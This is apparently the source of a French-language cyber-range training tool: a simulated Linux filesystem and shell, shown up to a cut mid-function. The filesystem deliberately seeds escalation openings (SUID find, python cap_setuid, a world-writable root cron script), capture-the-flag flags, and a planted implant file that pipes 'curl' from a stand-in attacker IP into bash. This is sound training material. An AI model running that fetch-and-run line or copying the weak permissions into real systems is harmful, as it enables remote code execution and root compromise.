// ============================================================================
// CYBERRANGE PRO - MOTEUR DE MACHINE VIRTUELLE & TERMINAL LINUX BASH HAUTE FIDÉLITÉ
// Architecture découplée : VFS POSIX, MachineBackend, VirtualShellBackend,
// DockerMachineBackend, xterm.js interactif (zéro collision DOM), et Tutoriel Débutant.
// ============================================================================

(function (global) {
  'use strict';

  // --------------------------------------------------------------------------
  // 1. VFSNode : Nœud du Système de Fichiers Virtuel (Fichier ou Répertoire)
  // --------------------------------------------------------------------------
  class VFSNode {
    constructor({
      name,
      type = 'file',
      content = '',
      permissions = '0644',
      owner = 'operator',
      group = 'operator',
      suid = false,
      sgid = false,
      capabilities = null,
      mtime = new Date('2026-10-27T10:00:00Z')
    }) {
      this.name = name;
      this.type = type; // 'file' | 'dir'
      this.content = content; // string pour fichier, Map pour répertoire
      this.permissions = permissions; // '0755', '0644', '4755', etc.
      this.owner = owner;
      this.group = group;
      this.suid = suid || permissions.startsWith('4');
      this.sgid = sgid || permissions.startsWith('2');
      this.capabilities = capabilities; // ex: 'cap_setuid+ep'
      this.mtime = mtime;
    }

    getPermissionString() {
      const mode = parseInt(this.permissions.slice(-3), 8);
      const isDir = this.type === 'dir';
      const r = (b) => (b ? 'r' : '-');
      const w = (b) => (b ? 'w' : '-');
      const x = (b, s) => (s ? (b ? 's' : 'S') : b ? 'x' : '-');

      const uR = r(mode & 0o400);
      const uW = w(mode & 0o200);
      const uX = x(mode & 0o100, this.suid);

      const gR = r(mode & 0o040);
      const gW = w(mode & 0o020);
      const gX = x(mode & 0o010, this.sgid);

      const oR = r(mode & 0o004);
      const oW = w(mode & 0o002);
      const oX = x(mode & 0o001, false);

      return `${isDir ? 'd' : '-'}${uR}${uW}${uX}${gR}${gW}${gX}${oR}${oW}${oX}`;
    }
  }

  // --------------------------------------------------------------------------
  // 2. VirtualFileSystem : Système de Fichiers Virtuel POSIX Complet
  // --------------------------------------------------------------------------
  class VirtualFileSystem {
    constructor() {
      this.root = new VFSNode({ name: '/', type: 'dir', permissions: '0755', owner: 'root', group: 'root' });
      this.root.content = new Map();
      this.initialState = null;
      this.buildDefaultTree();
      this.saveInitialSnapshot();
    }

    buildDefaultTree() {
      // 1. Répertoires de base POSIX standard
      const dirs = [
        ['/bin', '0755', 'root', 'root'],
        ['/sbin', '0755', 'root', 'root'],
        ['/usr', '0755', 'root', 'root'],
        ['/usr/bin', '0755', 'root', 'root'],
        ['/usr/sbin', '0755', 'root', 'root'],
        ['/usr/local', '0755', 'root', 'root'],
        ['/usr/local/bin', '0755', 'root', 'root'],
        ['/etc', '0755', 'root', 'root'],
        ['/etc/apt', '0755', 'root', 'root'],
        ['/var', '0755', 'root', 'root'],
        ['/var/log', '0755', 'root', 'root'],
        ['/var/log/incident', '0755', 'root', 'root'],
        ['/var/log/nginx', '0755', 'root', 'root'],
        ['/var/www', '0755', 'www-data', 'www-data'],
        ['/opt', '0755', 'root', 'root'],
        ['/opt/maintenance', '0755', 'root', 'root'],
        ['/opt/telemetry', '0755', 'root', 'root'],
        ['/home', '0755', 'root', 'root'],
        ['/home/operator', '0750', 'operator', 'operator'],
        ['/home/operator/projet_secret', '0750', 'operator', 'operator'],
        ['/tmp', '1777', 'root', 'root'],
        ['/tmp/cache', '0777', 'root', 'root'],
        ['/root', '0700', 'root', 'root'],
        ['/proc', '0555', 'root', 'root']
      ];

      dirs.forEach(([p, perm, u, g]) => this.mkdir(p, { permissions: perm, owner: u, group: g, parents: true }));

      // 2. Fichiers système fondamentaux (/etc)
      this.writeFile('/etc/hostname', 'cyberlab-workstation\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/os-release', 'NAME="Debian GNU/Linux"\nVERSION="12 (bookworm)"\nID=debian\nVERSION_ID="12"\nPRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/issue', 'Debian GNU/Linux 12 \\n \\l\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/hosts', '127.0.0.1 localhost cyberlab-workstation aegis.local\n192.168.1.1 routeur.local\n192.168.10.5 ns1.infra.aegis.local\n10.30.45.88 target.cyberlab.local\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/resolv.conf', 'nameserver 127.0.0.53\nsearch aegis.local cyberlab.local\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/passwd', 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\noperator:x:1001:1001:Opérateur RedTeam:/home/operator:/bin/bash\nwww-data:x:33:33:Serveur Web Apache:/var/www:/usr/sbin/nologin\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/shadow', 'root:$6$salt$Z4mK9...:19000:0:99999:7:::\noperator:$6$vX982mP$K9vX...:19000:0:99999:7:::\n', { permissions: '0640', owner: 'root', group: 'shadow' });
      this.writeFile('/etc/crontab', '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n* * * * * root /opt/maintenance/cleanup.sh\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/etc/apt/sources.list', 'deb http://deb.debian.org/debian bookworm main\ndeb http://security.debian.org/debian-security bookworm-security main\n', { permissions: '0644', owner: 'root', group: 'root' });

      // 3. Dossier personnel opérateur (/home/operator)
      this.writeFile('/home/operator/notes.txt', 'BIENVENUE DANS TON LAB CYBER :\n- Le terminal est ton arme principale.\n- Commandes de base : whoami (qui tu es), pwd (où tu es), ls (fichiers), cat (lire).\n- Consulte le panneau "Mission" à gauche pour découvrir tes objectifs.\n- La curiosité et la méthode font les meilleurs hackers !\n', { permissions: '0644', owner: 'operator', group: 'operator' });
      this.writeFile('/home/operator/user.txt', 'CYBERLAB{user_linux_capabilities_enumerated_441}\n', { permissions: '0644', owner: 'operator', group: 'operator' });
      this.writeFile('/home/operator/.bashrc', '# ~/.bashrc: execute par bash pour les shells interactifs\nexport PS1="\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ "\nalias ll="ls -la"\nalias l="ls -CF"\n', { permissions: '0644', owner: 'operator', group: 'operator' });
      this.writeFile('/home/operator/.bash_history', 'whoami\npwd\nls -la\ncat notes.txt\n', { permissions: '0600', owner: 'operator', group: 'operator' });
      this.writeFile('/home/operator/projet_secret/flag_novice.txt', 'CYBER{LINUX_NAVIGATOR_LEVEL_COMPLETED}\n', { permissions: '0644', owner: 'operator', group: 'operator' });

      // 4. Dossier maintenance & scripts (/opt)
      this.writeFile('/opt/maintenance/cleanup.sh', '#!/bin/bash\n# Script de maintenance execute par root chaque minute\nrm -rf /tmp/cache/*\n', { permissions: '0777', owner: 'root', group: 'root' });
      this.writeFile('/opt/telemetry/beacon.sh', '#!/bin/bash\n# Telemetrie interne du lab\ncurl -s http://127.0.0.1:3333/api/version > /dev/null\n', { permissions: '0755', owner: 'root', group: 'root' });

      // 5. Journaux & artefacts (/var/log)
      this.writeFile('/var/log/incident/report.log', '[SOC INCIDENT REPORT #2026-9041]\nTimestamp: 2026-10-27T10:14:02Z\nVector: Unauthorized SSH session\nAlert: Forensic evidence stored in hidden casefile\nStatus: UNRESOLVED\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/var/log/incident/.forensic_case', '[EVIDENCE ARTEFACT]\nCASE_ID: #AEGIS-INC-9942\nMD5: 8f4b1192e27c1a\nFLAG: CYBER{LINUX_MID_EVAL_FORENSIC_MASTERED}\nNOTE: Threat actor traced to internal gateway.\n', { permissions: '0644', owner: 'root', group: 'root' });
      this.writeFile('/var/log/auth.log', 'Oct 27 08:12:01 aegis-server CRON[4102]: (root) CMD (/opt/maintenance/cleanup.sh)\nOct 27 08:14:22 aegis-server sshd[4150]: Accepted password for operator from 192.168.1.42\n', { permissions: '0640', owner: 'root', group: 'adm' });
      this.writeFile('/var/log/nginx/access.log', '192.168.1.42 - - [27/Oct/2026:08:15:10] "GET / HTTP/1.1" 200 42\n192.168.1.42 - - [27/Oct/2026:08:16:00] "GET /robots.txt HTTP/1.1" 200 128 FLAG=CYBER{HTTP_GET_ROBOTS_TXT_FOUND}\n', { permissions: '0644', owner: 'www-data', group: 'adm' });

      // 6. Dossier root sécurisé (/root)
      this.writeFile('/root/flag.txt', 'CYBERLAB{LINUX_CAP_SETUID_PYTHON3_ROOT_SHELL}\n', { permissions: '0600', owner: 'root', group: 'root' });
      this.writeFile('/root/root.txt', 'CYBERLAB{LINUX_CAP_SETUID_PYTHON3_ROOT_SHELL}\n', { permissions: '0600', owner: 'root', group: 'root' });
      this.writeFile('/root/final_flag.txt', 'CYBER{M5_BOSS_ROOT_COMPROMISE_FINAL_FLAG}\n', { permissions: '0600', owner: 'root', group: 'root' });

      // 7. Binaires simulés dans /bin et /usr/bin
      const binList = ['bash', 'sh', 'ls', 'cat', 'pwd', 'cd', 'mkdir', 'touch', 'cp', 'mv', 'rm', 'head', 'tail', 'wc', 'grep', 'find', 'curl', 'ping', 'ss', 'id', 'whoami', 'uname', 'hostname', 'clear', 'echo', 'chmod', 'chown', 'env', 'export', 'date', 'uptime', 'df', 'kill', 'ps', 'which', 'history', 'reset', 'help'];
      binList.forEach(b => this.writeFile(`/bin/${b}`, `ELF binary: ${b}\n`, { permissions: '0755', owner: 'root', group: 'root' }));

      const usrBinList = ['python3', 'python3.8', 'python3.10', 'nmap', 'dig', 'nslookup', 'base64', 'top', 'apt', 'nc', 'netcat', 'sudo', 'getcap'];
      usrBinList.forEach(b => this.writeFile(`/usr/bin/${b}`, `ELF binary: ${b}\n`, { permissions: '0755', owner: 'root', group: 'root' }));

      // Configuration spéciale de vulnérabilités GTFOBins & Capabilities
      // - find avec bit SUID (mode 4755)
      this.writeFile('/usr/bin/find', 'ELF binary: find with SUID\n', { permissions: '4755', owner: 'root', group: 'root', suid: true });
      // - python3.8 avec cap_setuid+ep
      const pyNode = this.getNode('/usr/bin/python3.8');
      if (pyNode) pyNode.capabilities = 'cap_setuid+ep';
      const pingNode = this.getNode('/bin/ping');
      if (pingNode) pingNode.capabilities = 'cap_net_raw+ep';
    }

    saveInitialSnapshot() {
      // Sauvegarde une copie sérialisée de l'arborescence pour un reset instantané
      this.initialSnapshot = this.exportTree();
    }

    reset() {
      this.root = new VFSNode({ name: '/', type: 'dir', permissions: '0755', owner: 'root', group: 'root' });
      this.root.content = new Map();
      this.buildDefaultTree();
    }

    normalizePath(p) {
      if (!p) return '/';
      const segments = p.split('/').filter(Boolean);
      const stack = [];
      for (const seg of segments) {
        if (seg === '.') continue;
        if (seg === '..') {
          if (stack.length > 0) stack.pop();
        } else {
          stack.push(seg);
        }
      }
      return '/' + stack.join('/');
    }

    resolvePath(cwd, p, user = 'operator') {
      if (!p) return cwd || '/';
      const homeDir = (user === 'root') ? '/root' : '/home/operator';
      if (p === '~') return homeDir;
      if (p.startsWith('~/')) return this.normalizePath(homeDir + '/' + p.slice(2));
      if (p.startsWith('/')) return this.normalizePath(p);
      return this.normalizePath((cwd === '/' ? '' : cwd) + '/' + p);
    }

    getNode(absPath) {
      const norm = this.normalizePath(absPath);
      if (norm === '/') return this.root;
      const parts = norm.split('/').filter(Boolean);
      let curr = this.root;
      for (let i = 0; i < parts.length; i++) {
        const seg = parts[i];
        if (curr.type !== 'dir' || !curr.content.has(seg)) {
          return null;
        }
        curr = curr.content.get(seg);
      }
      return curr;
    }

    mkdir(absPath, options = {}, user = 'root', euid = 0) {
      const norm = this.normalizePath(absPath);
      if (norm === '/') return this.root;
      const parts = norm.split('/').filter(Boolean);
      let curr = this.root;

      for (let i = 0; i < parts.length; i++) {
        const seg = parts[i];
        const isLast = i === parts.length - 1;

        if (curr.content.has(seg)) {
          const next = curr.content.get(seg);
          if (isLast && !options.parents) {
            throw new Error(`cannot create directory '${absPath}': File exists`);
          }
          if (next.type !== 'dir') {
            throw new Error(`cannot create directory '${absPath}': Not a directory`);
          }
          curr = next;
        } else {
          if (!isLast && !options.parents) {
            throw new Error(`cannot create directory '${absPath}': No such file or directory`);
          }
          if (user !== 'system' && !this.checkPermission(curr, 'wx', user, euid)) {
            throw new Error(`cannot create directory '${absPath}': Permission denied`);
          }
          const newNode = new VFSNode({
            name: seg,
            type: 'dir',
            permissions: isLast && options.permissions ? options.permissions : '0755',
            owner: isLast && options.owner ? options.owner : (user === 'root' ? 'root' : user),
            group: isLast && options.group ? options.group : (user === 'root' ? 'root' : user)
          });
          newNode.content = new Map();
          curr.content.set(seg, newNode);
          curr = newNode;
        }
      }
      return curr;
    }

    writeFile(absPath, content, options = {}, user = 'root', euid = 0) {
      const norm = this.normalizePath(absPath);
      const parts = norm.split('/').filter(Boolean);
      const fileName = parts.pop();
      const dirPath = '/' + parts.join('/');

      let parentDir = this.getNode(dirPath);
      if (!parentDir) {
        parentDir = this.mkdir(dirPath, { parents: true, owner: options.owner || 'root', group: options.group || 'root' }, user, euid);
      }

      if (parentDir.type !== 'dir') {
        throw new Error(`cannot create file '${absPath}': Not a directory`);
      }

      let fileNode = parentDir.content.get(fileName);
      if (!fileNode) {
        if (user !== 'system' && !this.checkPermission(parentDir, 'wx', user, euid)) {
          throw new Error(`cannot create file '${absPath}': Permission denied`);
        }
        fileNode = new VFSNode({
          name: fileName,
          type: 'file',
          content: content || '',
          permissions: options.permissions || '0644',
          owner: options.owner || (user === 'root' ? 'root' : user),
          group: options.group || (user === 'root' ? 'root' : user),
          suid: options.suid || false,
          capabilities: options.capabilities || null
        });
        parentDir.content.set(fileName, fileNode);
      } else {
        if (fileNode.type === 'dir') {
          throw new Error(`cannot write '${absPath}': Is a directory`);
        }
        if (user !== 'system' && !this.checkPermission(fileNode, 'w', user, euid)) {
          throw new Error(`cannot write '${absPath}': Permission denied`);
        }
        fileNode.content = content || '';
        if (options.permissions) fileNode.permissions = options.permissions;
        if (options.owner) fileNode.owner = options.owner;
        if (options.group) fileNode.group = options.group;
        if (options.suid !== undefined) fileNode.suid = !!options.suid;
        if (options.capabilities !== undefined) fileNode.capabilities = options.capabilities;
        fileNode.mtime = new Date();
      }
      return fileNode;
    }

    readFile(absPath, user = 'operator', euid = 1001) {
      const node = this.getNode(absPath);
      if (!node) {
        throw new Error(`${absPath}: No such file or directory`);
      }
      if (node.type === 'dir') {
        throw new Error(`${absPath}: Is a directory`);
      }

      // Vérification permissions POSIX
      if (!this.checkPermission(node, 'r', user, euid)) {
        throw new Error(`${absPath}: Permission denied`);
      }
      return node.content;
    }

    listDir(absPath, user = 'operator', euid = 1001) {
      const node = this.getNode(absPath);
      if (!node) {
        throw new Error(`cannot access '${absPath}': No such file or directory`);
      }
      if (node.type !== 'dir') {
        throw new Error(`cannot access '${absPath}': Not a directory`);
      }
      if (!this.checkPermission(node, 'r', user, euid)) {
        throw new Error(`cannot open directory '${absPath}': Permission denied`);
      }

      const results = [];
      node.content.forEach((childNode) => {
        results.push(childNode);
      });
      return results;
    }

    remove(absPath, user = 'operator', euid = 1001, recursive = false) {
      const norm = this.normalizePath(absPath);
      if (norm === '/') throw new Error(`cannot remove root directory '/'`);
      const parts = norm.split('/').filter(Boolean);
      const name = parts.pop();
      const parentPath = '/' + parts.join('/');
      const parent = this.getNode(parentPath);
      if (!parent || parent.type !== 'dir') {
        throw new Error(`cannot remove '${absPath}': No such file or directory`);
      }

      const node = parent.content.get(name);
      if (!node) {
        throw new Error(`cannot remove '${absPath}': No such file or directory`);
      }

      if (!this.checkPermission(parent, 'w', user, euid)) {
        throw new Error(`cannot remove '${absPath}': Permission denied`);
      }

      if (node.type === 'dir' && !recursive) {
        throw new Error(`cannot remove '${absPath}': Is a directory`);
      }

      parent.content.delete(name);
      return true;
    }

    checkPermission(node, requiredMode, user = 'operator', euid = 1001) {
      if (euid === 0 || user === 'root') return true; // root outrepasse les droits r/w classiques

      const mode = parseInt(node.permissions.slice(-3), 8);
      const isOwner = node.owner === user;
      const isGroup = node.group === user || (user === 'operator' && node.group === 'operator');

      let bits = 0;
      if (isOwner) {
        bits = (mode >> 6) & 0o7;
      } else if (isGroup) {
        bits = (mode >> 3) & 0o7;
      } else {
        bits = mode & 0o7;
      }

      if (requiredMode.includes('r') && !(bits & 0o4)) return false;
      if (requiredMode.includes('w') && !(bits & 0o2)) return false;
      if (requiredMode.includes('x') && !(bits & 0o1)) return false;

      return true;
    }

    find(startPath = '/', criteria = {}) {
      const results = [];
      const queue = [this.normalizePath(startPath)];

      while (queue.length > 0) {
        const currPath = queue.shift();
        const node = this.getNode(currPath);
        if (!node) continue;

        let match = true;
        if (criteria.name) {
          const regex = new RegExp('^' + criteria.name.replace(/\*/g, '.*') + '$');
          if (!regex.test(node.name)) match = false;
        }
        if (criteria.type) {
          if (criteria.type === 'f' && node.type !== 'file') match = false;
          if (criteria.type === 'd' && node.type !== 'dir') match = false;
        }
        if (criteria.perm) {
          const isSuid = criteria.perm === '-4000' || criteria.perm === '/4000' || criteria.perm === '4000' || criteria.perm === '-u=s' || criteria.perm === '/u=s';
          if (isSuid && !node.suid) match = false;
        }

        if (match && currPath !== '/') {
          results.push({ path: currPath, node });
        }

        if (node.type === 'dir') {
          if (criteria.user && criteria.euid !== undefined && !this.checkPermission(node, 'rx', criteria.user, criteria.euid)) {
            continue;
          }
          node.content.forEach((child, childName) => {
            const childPath = currPath === '/' ? '/' + childName : currPath + '/' + childName;
            queue.push(childPath);
          });
        }
      }
      return results;
    }

    // Export pour rétro-compatibilité (this.fs dictionnaire)
    exportLegacyDictionary() {
      const dict = {};
      const traverse = (node, fullPath) => {
        if (node.type === 'dir') {
          dict[fullPath] = Array.from(node.content.keys());
          node.content.forEach((child, name) => {
            const p = fullPath === '/' ? '/' + name : fullPath + '/' + name;
            traverse(child, p);
          });
        } else {
          dict[fullPath] = node.content;
        }
      };
      traverse(this.root, '/');
      return dict;
    }

    exportLegacyPermissions() {
      const dict = {};
      const traverse = (node, fullPath) => {
        dict[fullPath] = node.getPermissionString();
        if (node.type === 'dir') {
          node.content.forEach((child, name) => {
            const p = fullPath === '/' ? '/' + name : fullPath + '/' + name;
            traverse(child, p);
          });
        }
      };
      traverse(this.root, '/');
      return dict;
    }

    exportTree() {
      const dump = [];
      const traverse = (node, p) => {
        dump.push({
          path: p,
          type: node.type,
          content: node.type === 'file' ? node.content : null,
          permissions: node.permissions,
          owner: node.owner,
          group: node.group,
          suid: node.suid,
          capabilities: node.capabilities
        });
        if (node.type === 'dir') {
          node.content.forEach((child, name) => {
            const childPath = p === '/' ? '/' + name : p + '/' + name;
            traverse(child, childPath);
          });
        }
      };
      traverse(this.root, '/');
      return dump;
    }

    applyChallenge(challenge) {
      if (!challenge) return;

      // 1. Ingestion de l'injection VFS dynamique (fournie par startInstance ou snapshot)
      const injection = challenge.vfs_injection || challenge.vfs_files;
      if (injection && typeof injection === 'object') {
        for (const [absPath, spec] of Object.entries(injection)) {
          if (!spec) continue;
          const content = typeof spec === 'string' ? spec : (spec.content !== undefined ? spec.content : '');
          const permissions = spec.permissions || '0644';
          const owner = spec.owner || 'root';
          const group = spec.group || 'root';
          const suid = !!spec.suid;
          const capabilities = spec.capabilities || null;

          try {
            const node = this.writeFile(absPath, content, { permissions, owner, group, suid, capabilities }, 'root', 0);
            if (suid && node) {
              node.suid = true;
            }
          } catch (e) {
            console.warn(`[VFS] Échec d'injection pour ${absPath}:`, e.message);
          }
        }
      }

      // 2. Définitions par défaut pour les boxes de campagne (mode hors-ligne ou fallback)
      if (challenge.id === 'aegis-box-01-perimeter') {
        if (!this.getNode('/usr/local/bin/aegis-sync')) {
          this.writeFile('/usr/local/bin/aegis-sync', '#!/bin/bash\n# Aegis Perimeter Sync Daemon (SUID)\n', { permissions: '4755', owner: 'root', group: 'root', suid: true }, 'root', 0);
        }
        if (!this.getNode('/var/log/nginx/access.log')) {
          this.writeFile('/var/log/nginx/access.log', '198.51.100.42 - - [27/Oct/2026:03:14:22 +0000] "POST /portal/api/exchange HTTP/1.1" 200 482 "-" "Chimera-Tool/3.1"\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
        }
      } else if (challenge.id === 'aegis-box-02-internal') {
        if (!this.getNode('/opt/maintenance/aegis-backup.sh')) {
          this.writeFile('/opt/maintenance/aegis-backup.sh', '#!/bin/bash\n# Scheduled backup\ntar -czf /var/backups/nexus.tar.gz /var/www 2>/dev/null\n', { permissions: '0777', owner: 'operator', group: 'operator' }, 'root', 0);
        }
        if (!this.getNode('/tmp/chimera_implant_cron.sh')) {
          this.writeFile('/tmp/chimera_implant_cron.sh', '#!/bin/bash\n# Persistent cron beacon\ncurl -s http://198.51.100.42:9090/implant | bash\n', { permissions: '0755', owner: 'operator', group: 'operator' }, 'root', 0);
        }
        if (!this.getNode('/var/log/syslog')) {
          this.writeFile('/var/log/syslog', 'Oct 27 03:22:15 nexus CRON[412]: (root) CMD (/tmp/chimera_implant_cron.sh)\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
        }
      } else if (challenge.id === 'aegis-box-03-vault') {
        if (!this.getNode('/usr/bin/aegis-vault-ctl')) {
          this.writeFile('/usr/bin/aegis-vault-ctl', '#!/bin/bash\n# Shadow Vault Controller\n', { permissions: '4755', owner: 'root', group: 'root', suid: true }, 'root', 0);
        }
        if (!this.getNode('/opt/telemetry/shadow_dropper')) {
          this.writeFile('/opt/telemetry/shadow_dropper', '#!/bin/bash\n# CHIMERA_IMPLANT_V1\n# Payload C2 beacon\n', { permissions: '0755', owner: 'operator', group: 'operator' }, 'root', 0);
        }
        if (!this.getNode('/var/log/suricata/eve.json')) {
          this.writeFile('/var/log/suricata/eve.json', '{"timestamp":"2026-10-27T04:12:00Z","event_type":"dns","dns":{"query":[{"rrname":"beacon-alpha.chimera-apt.net","type":"A"}]}}\n', { permissions: '0644', owner: 'root', group: 'adm' }, 'root', 0);
        }
      }

      // 3. Flags statiques de repli si non déjà injectés dynamiquement
      const tasks = challenge.tasks || [];
      const rootTask = tasks.find(t =>
        (t.id === 't3') ||
        (t.title || '').toLowerCase().includes('root') ||
        (t.canonical_flag || '').toLowerCase().includes('root') ||
        (t.description || '').toLowerCase().includes('root')
      ) || tasks[tasks.length - 1];

      const userTask = tasks.find(t =>
        (t.id === 't2') ||
        (t.title || '').toLowerCase().includes('user') ||
        (t.canonical_flag || '').toLowerCase().includes('user')
      ) || tasks[0];

      const hasInjectedUser = injection && injection['/home/operator/user.txt'];
      if (!hasInjectedUser && userTask && userTask.canonical_flag) {
        this.writeFile('/home/operator/user.txt', userTask.canonical_flag + '\n', { permissions: '0644', owner: 'operator', group: 'operator' });
      }

      const hasInjectedRoot = injection && (injection['/root/root.txt'] || injection['/root/flag.txt']);
      if (!hasInjectedRoot && rootTask && rootTask.canonical_flag) {
        this.writeFile('/root/root.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
        this.writeFile('/root/flag.txt', rootTask.canonical_flag + '\n', { permissions: '0600', owner: 'root', group: 'root' });
      }
    }
  }

  // --------------------------------------------------------------------------
  // 3. MachineBackend : Interface Abstraite pour les Moteurs de Machine
  // --------------------------------------------------------------------------
  class MachineBackend {
    async init(options = {}) {
      throw new Error('MachineBackend: init() must be implemented.');
    }
    async execute(cmdStr, options = {}) {
      throw new Error('MachineBackend: execute() must be implemented.');
    }
    async getCompletions(currentLine) {
      return [];
    }
    async destroy() {}
    onOutput(callback) {
      this.outputCallback = callback;
    }
    onPrivilegeChange(callback) {
      this.privilegeCallback = callback;
    }
  }

  // Helper : Découpage POSIX respectant les guillemets simples et doubles
  function tokenizeCommandLine(cmdStr) {
    const tokens = [];
    let current = '';
    let inSingleQuote = false;
    let inDoubleQuote = false;
    let escape = false;

    for (let i = 0; i < cmdStr.length; i++) {
      const ch = cmdStr[i];

      if (escape) {
        current += ch;
        escape = false;
        continue;
      }

      if (ch === '\\' && !inSingleQuote) {
        escape = true;
        continue;
      }

      if (ch === "'" && !inDoubleQuote) {
        inSingleQuote = !inSingleQuote;
        continue;
      }

      if (ch === '"' && !inSingleQuote) {
        inDoubleQuote = !inDoubleQuote;
        continue;
      }

      if (/\s/.test(ch) && !inSingleQuote && !inDoubleQuote) {
        if (current.length > 0) {
          tokens.push(current);
          current = '';
        }
        continue;
      }

      current += ch;
    }

    if (current.length > 0) {
      tokens.push(current);
    }

    return tokens;
  }

  // --------------------------------------------------------------------------
  // 4. VirtualShellBackend : Moteur de Shell Bash Sandboxé Déterministe
  // --------------------------------------------------------------------------
  class VirtualShellBackend extends MachineBackend {
    constructor(vfs, options = {}) {
      super();
      this.vfs = vfs || new VirtualFileSystem();
      this.options = options;
      this.user = 'operator';
      this.uid = 1001;
      this.gid = 1001;
      this.eUID = 1001;
      this.isRoot = false;
      this.hostname = options.hostname || 'cyberlab';
      this.currentPath = '/home/operator';
      this.lastExitCode = 0;
      this.installedPackages = ['bash', 'coreutils', 'grep', 'sed', 'gawk', 'curl', 'ping', 'nmap'];
      this.env = {
        USER: 'operator',
        HOME: '/home/operator',
        SHELL: '/bin/bash',
        TERM: 'xterm-256color',
        PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
        PWD: '/home/operator',
        HOSTNAME: this.hostname
      };

      if (this.options.challenge) {
        this.vfs.applyChallenge(this.options.challenge);
      }
    }

    async init() {
      return { success: true, user: this.user, cwd: this.currentPath };
    }

    setPrivilege(isRoot) {
      this.isRoot = isRoot;
      this.eUID = isRoot ? 0 : 1001;
      this.user = isRoot ? 'root' : 'operator';
      this.env.USER = this.user;
      this.env.HOME = isRoot ? '/root' : '/home/operator';
      if (this.privilegeCallback) {
        this.privilegeCallback({ isRoot: this.isRoot, eUID: this.eUID, user: this.user });
      }
    }

    getPromptString() {
      const symbol = this.isRoot ? '#' : '$';
      const folder = this.currentPath === '/home/operator' ? '~' : (this.currentPath === '/root' && this.isRoot ? '~' : this.currentPath);
      return `${this.user}@${this.hostname}:${folder}${symbol}`;
    }

    getAnsiPrompt() {
      const userColor = this.isRoot ? '\x1b[1;31m' : '\x1b[1;32m';
      const pathColor = '\x1b[1;34m';
      const reset = '\x1b[0m';
      const symbol = this.isRoot ? '#' : '$';
      const folder = this.currentPath === '/home/operator' ? '~' : (this.currentPath === '/root' && this.isRoot ? '~' : this.currentPath);
      return `${userColor}${this.user}@${this.hostname}${reset}:${pathColor}${folder}${reset}${symbol} `;
    }

    async execute(cmdLine) {
      const trimmed = (cmdLine || '').trim();
      if (!trimmed) {
        return { stdout: '', stderr: '', exitCode: 0 };
      }

      const chainParts = this.splitChainCommands(trimmed);
      let combinedStdout = '';
      let combinedStderr = '';
      let lastExit = 0;

      for (let i = 0; i < chainParts.length; i++) {
        const { op, cmd } = chainParts[i];

        if (i > 0) {
          if (op === '&&' && lastExit !== 0) break;
          if (op === '||' && lastExit === 0) continue;
        }

        const res = await this.executePipeline(cmd);
        if (res.stdout) combinedStdout += res.stdout;
        if (res.stderr) combinedStderr += res.stderr;
        lastExit = res.exitCode;
        this.lastExitCode = lastExit;
      }

      return { stdout: combinedStdout, stderr: combinedStderr, exitCode: lastExit };
    }

    splitChainCommands(cmdLine) {
      const parts = [];
      let current = '';
      let inSingleQuote = false;
      let inDoubleQuote = false;
      let currentOp = ';';

      for (let i = 0; i < cmdLine.length; i++) {
        const ch = cmdLine[i];
        const nextCh = cmdLine[i + 1];

        if (ch === "'" && !inDoubleQuote) {
          inSingleQuote = !inSingleQuote;
          current += ch;
          continue;
        }
        if (ch === '"' && !inSingleQuote) {
          inDoubleQuote = !inDoubleQuote;
          current += ch;
          continue;
        }

        if (!inSingleQuote && !inDoubleQuote) {
          if (ch === '&' && nextCh === '&') {
            parts.push({ op: currentOp, cmd: current.trim() });
            current = '';
            currentOp = '&&';
            i++;
            continue;
          }
          if (ch === '|' && nextCh === '|') {
            parts.push({ op: currentOp, cmd: current.trim() });
            current = '';
            currentOp = '||';
            i++;
            continue;
          }
          if (ch === ';') {
            parts.push({ op: currentOp, cmd: current.trim() });
            current = '';
            currentOp = ';';
            continue;
          }
        }
        current += ch;
      }

      if (current.trim().length > 0) {
        parts.push({ op: currentOp, cmd: current.trim() });
      }

      return parts.length > 0 ? parts : [{ op: ';', cmd: cmdLine.trim() }];
    }

    splitPipeSegments(cmdLine) {
      const segments = [];
      let current = '';
      let inSingleQuote = false;
      let inDoubleQuote = false;

      for (let i = 0; i < cmdLine.length; i++) {
        const ch = cmdLine[i];
        if (ch === "'" && !inDoubleQuote) {
          inSingleQuote = !inSingleQuote;
          current += ch;
          continue;
        }
        if (ch === '"' && !inSingleQuote) {
          inDoubleQuote = !inDoubleQuote;
          current += ch;
          continue;
        }

        if (ch === '|' && !inSingleQuote && !inDoubleQuote) {
          segments.push(current.trim());
          current = '';
          continue;
        }
        current += ch;
      }

      if (current.trim().length > 0) {
        segments.push(current.trim());
      }
      return segments.length > 0 ? segments : [cmdLine.trim()];
    }

    async executePipeline(cmdLine) {
      const pipeSegments = this.splitPipeSegments(cmdLine);
      let currentInput = null;
      let lastStderr = '';
      let lastExit = 0;

      for (let i = 0; i < pipeSegments.length; i++) {
        const seg = pipeSegments[i];
        const res = this.executeCommandSegment(seg, currentInput);
        if (res.exitCode !== 0 && i < pipeSegments.length - 1) {
          return { stdout: res.stdout || '', stderr: res.stderr || '', exitCode: res.exitCode };
        }
        currentInput = res.stdout;
        lastStderr = res.stderr;
        lastExit = res.exitCode;
      }

      return { stdout: currentInput || '', stderr: lastStderr || '', exitCode: lastExit };
    }

    executeCommandSegment(cmdSegment, inputPipe = null) {
      let cmdStr = cmdSegment.trim();
